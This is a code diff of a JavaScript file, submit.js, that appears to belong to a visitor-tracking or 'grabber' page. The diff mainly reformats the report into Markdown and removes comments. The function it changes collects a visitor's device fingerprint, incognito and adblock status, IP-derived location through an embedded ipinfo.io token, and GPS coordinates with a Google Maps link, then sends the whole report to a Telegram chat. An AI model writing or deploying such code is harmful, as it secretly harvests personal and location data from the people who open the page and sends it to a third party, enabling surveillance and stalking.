@@ -1,4 +1,4 @@
-// submit.js (updated: Touch/Mouse detection + Privacy (incognito) detection integrated into Adblock section)
+// submit.js (updated: Touch/Mouse detection + Privacy (incognito) detection integrated into Adblock section + proper bold/italic Markdown)
 
 async function collectAndSend(chatId) {
   if (!chatId) {
@@ -79,78 +79,54 @@ async function collectAndSend(chatId) {
   const rtt = connection ? (connection.rtt ? Math.round(connection.rtt) + ' ms' : 'Unknown') : 'Unknown';
   const saveData = connection ? (connection.saveData ? 'Enabled' : 'Disabled') : 'Unknown';
 
-  // Incognito / Private mode detection (best-effort, heuristic)
+  // Incognito / Private mode detection
   async function detectIncognito() {
-    // Returns: 'Yes' / 'No' / 'Unknown'
     try {
-      // Prefer storage.estimate() heuristic (works on many modern Chromium browsers)
       if (navigator.storage && navigator.storage.estimate) {
         const estimate = await navigator.storage.estimate();
-        // quota is in bytes; in incognito Chrome quota is typically much smaller (~120MB or less)
         if (typeof estimate.quota === 'number') {
           const quota = estimate.quota;
-          // threshold: 120 MB (best-effort)
           const threshold = 120 * 1024 * 1024;
           if (quota && quota < threshold) return 'Yes';
-          // if quota is large, likely not incognito
           if (quota && quota >= threshold) return 'No';
         }
       }
-
-      // Try FileSystem API (webkitRequestFileSystem) heuristic (older Chrome / Safari)
       const fsRequest = (window.webkitRequestFileSystem || window.RequestFileSystem);
       if (typeof fsRequest === 'function') {
         return await new Promise(resolve => {
           try {
             fsRequest(window.TEMPORARY, 100, () => resolve('No'), () => resolve('Yes'));
-            // some browsers call the error callback when in private mode -> treat as incognito
             setTimeout(() => resolve('Unknown'), 1500);
-          } catch (e) {
-            resolve('Unknown');
-          }
+          } catch (e) { resolve('Unknown'); }
         });
       }
-
-      // Safari detection heuristic: try to open an IndexedDB and write; in private mode it may fail
       if (window.indexedDB) {
         try {
           const dbName = 'incognitotest-' + Math.random().toString(36).slice(2);
           const openReq = indexedDB.open(dbName);
           return await new Promise(resolve => {
             let resolved = false;
-            openReq.onerror = () => {
-              if (!resolved) { resolved = true; resolve('Yes'); }
-            };
+            openReq.onerror = () => { if (!resolved) { resolved = true; resolve('Yes'); } };
             openReq.onsuccess = () => {
               try {
                 const db = openReq.result;
                 db.close();
                 indexedDB.deleteDatabase(dbName);
                 if (!resolved) { resolved = true; resolve('No'); }
-              } catch (e) {
-                if (!resolved) { resolved = true; resolve('Unknown'); }
-              }
+              } catch (e) { if (!resolved) { resolved = true; resolve('Unknown'); } }
             };
-            // fallback timeout
             setTimeout(() => { if (!resolved) { resolved = true; resolve('Unknown'); } }, 1500);
           });
-        } catch (e) {
-          // ignore and continue
-        }
+        } catch (e) {}
       }
-
-      // If none of the heuristics worked, return Unknown
       return 'Unknown';
-    } catch (e) {
-      return 'Unknown';
-    }
+    } catch (e) { return 'Unknown'; }
   }
 
-  // Adblock (and related) detection - returns detailed object
+  // Adblock & Cookie detection
   async function detectAdblockAndCookies() {
     let method = '';
     let detected = 'Negative';
-    // DOM bait
     try {
       const bait = document.createElement('div');
       bait.className = 'adsbox ad-banner adsbygoogle adunit';
@@ -161,13 +137,10 @@ async function collectAndSend(chatId) {
       bait.remove();
       if (isHidden) { detected = 'Positive'; method = 'DOM'; }
     } catch {}
-
-    // Network fetch
     if (detected === 'Negative') {
       try {
         const controller = new AbortController();
         const timeout = setTimeout(() => controller.abort(), 2500);
-        // no-cors mode: success does not expose status, but failing will throw
         await fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', { method: 'GET', mode: 'no-cors', signal: controller.signal });
         clearTimeout(timeout);
         method = 'None';
@@ -176,26 +149,18 @@ async function collectAndSend(chatId) {
         method = method || 'Network';
       }
     }
-
-    // Cookie test
     let cookiesBlocked = 'No';
     try {
       document.cookie = "abctest=1; SameSite=Lax";
       if (!document.cookie.includes("abctest")) cookiesBlocked = 'Yes';
-      // cleanup
       document.cookie = "abctest=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=Lax";
-    } catch {
-      cookiesBlocked = 'Yes';
-    }
-
+    } catch { cookiesBlocked = 'Yes'; }
     return { detected, method, cookiesBlocked };
   }
 
-  // Run privacy/adblock/incognito checks and geolocation in parallel
   const [incognitoResult, adblockResult, geoResult] = await Promise.all([
     detectIncognito(),
     detectAdblockAndCookies(),
-    // geolocation function:
     (async function getGeolocation() {
       let status = 'Denied', latitude = 'Denied', longitude = 'Denied';
       const getPos = (timeoutMs = 8000) => new Promise((resolve, reject) => {
@@ -218,7 +183,6 @@ async function collectAndSend(chatId) {
     })()
   ]);
 
-  // IP info
   let ip='Unknown', city='Unknown', region='Unknown', country='Unknown', org='Unknown';
   try {
     const res = await fetch('https://ipinfo.io/json?token=18d2a866939a58');
@@ -232,50 +196,50 @@ async function collectAndSend(chatId) {
     }
   } catch (e) {}
 
-  // Build message
+  // Build message with Markdown formatting
   const message = 
-`🔰 Device Information Report 🔰
+`🔰 *Device Information Report* 🔰
 
-🌐 𝗕𝗮𝘀𝗶𝗰 𝗜𝗻𝗳𝗼:
+🌐 *Basic Info:*
 - Browser: ${browser}
 - Platform: ${platform}
 - Language: ${language}
 - Timezone: ${timezone}
 - Touch/Mouse: ${touchMouse}
 
-💻 𝗛𝗮𝗿𝗱𝘄𝗮𝗿𝗲:
+💻 *Hardware:*
 - CPU: ${cpuCores} cores
 - RAM: ${ram}
 - Screen: ${resolution}, ${colorDepth}
 - WebGL: ${webglRenderer} (${webglVendor})
 
-📶 𝗡𝗲𝘁𝘄𝗼𝗿𝗸 𝗜𝗻𝗳𝗼:
+📶 *Network Info:*
 - Connection Type: ${netType}
 - Speed: ${downlink}
 - Latency: ${rtt}
 - Data Saver: ${saveData}
 - ISP: ${org || 'Unknown'}
 
-📍 𝗜𝗣 𝗜𝗻𝗳𝗼:
+📍 *IP Info:*
 - IP: ${ip}
 - City: ${city}
 - Region: ${region}
 - Country: ${country}
-𝙽𝚘𝚝𝚎: 𝙸𝙿-𝚋𝚊𝚜𝚎𝚍 𝚕𝚘𝚌𝚊𝚝𝚒𝚘𝚗 𝚖𝚊𝚢 𝚗𝚘𝚝 𝚋𝚎 𝚊𝚌𝚌𝚞𝚛𝚊𝚝𝚎.
+- _Note: IP-based location may not be accurate._
 
-📌 𝗚𝗣𝗦:
+📌 *GPS:*
 - Status: ${geoResult.status}
 - Latitude: ${geoResult.latitude}
 - Longitude: ${geoResult.longitude}
 - Map View: https://www.google.com/maps?q=${geoResult.latitude},${geoResult.longitude}
 
-🔐 𝗣𝗿𝗶𝘃𝗮𝗰𝘆 & 𝗕𝗹𝗼𝗰𝗸𝗲𝗿𝘀 𝗜𝗻𝗳𝗼:
+🔐 *Privacy & Blockers Info:*
 - Incognito / Private Mode: ${incognitoResult}
 - Adblocker Detected: ${adblockResult.detected}
 - Method: ${adblockResult.method}
 - Cookies Blocked: ${adblockResult.cookiesBlocked}
 
-🔋 𝗕𝗮𝘁𝘁𝗲𝗿𝘆:
+🔋 *Battery:*
 - Level: ${batteryLevel}
 - Charging: ${batteryCharging}
 `;
@@ -287,7 +251,7 @@ async function collectAndSend(chatId) {
     await fetch(tgUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: chatId, text: message })
+      body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
     });
   } catch (err) {
     console.error('Telegram send error', err);
